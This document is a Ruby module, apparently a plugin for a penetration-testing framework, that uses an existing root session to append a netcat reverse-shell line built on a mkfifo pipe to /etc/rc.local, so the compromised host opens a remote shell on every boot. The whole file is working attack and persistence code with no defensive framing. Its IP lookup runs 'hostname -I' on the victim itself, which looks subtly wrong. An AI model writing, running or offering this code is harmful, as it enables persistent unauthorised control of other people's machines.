module RcLocalReverseShell
  def self.run(fm, sid, client)
    session = fm.sessions[sid]
    return unless session

    begin
      uid = session.shell_command_token('id -u').to_i
      unless uid == 0
        client.print_status("Session #{sid} is not root. Skipping /etc/rc.local.")
        return
      end
    rescue => e
      client.print_error("Failed to check UID: #{e}")
      return
    end
    
    rc_local = '/etc/rc.local'
    client.print_good("Session #{sid} is root. Injecting reverse shell...")

    attacker_ip   = session.shell_command_token("hostname -I | awk '{print $1}'").strip
    attacker_port = 4444 #still haven't learned how to get the port from the framework
    
    # Avoid duplication
    check_cmd = "grep -q '#{attacker_ip}' #{rc_local} 2>/dev/null && echo 'EXISTS'"
    return client.print_status("Payload already exists. Skipping.") if session.shell_command_token(check_cmd).include?('EXISTS')

    payload_line = "rm /tmp/f; mkfifo /tmp/f; nc #{attacker_ip} #{attacker_port} < /tmp/f | /bin/sh >/tmp/f 2>&1"

    begin
      content = session.shell_command_token("cat #{rc_local} 2>/dev/null")
    rescue
      content = "#!/bin/sh -e\n\n"
    end

    lines = content.split("\n")
    lines.pop if lines.last&.strip == 'exit 0'
    new_content = (lines + [payload_line, "exit 0"]).join("\n")

    write_cmd = <<~SHELL
      cat > #{rc_local} << 'EOF'
      #{new_content}
      EOF
      chmod +x #{rc_local}
    SHELL

    begin
      session.shell_command(write_cmd)
      client.print_good("Payload successfully injected!")
    rescue => e
      client.print_error("Failed to write to #{rc_local}: #{e.message}")
    end
  end
end
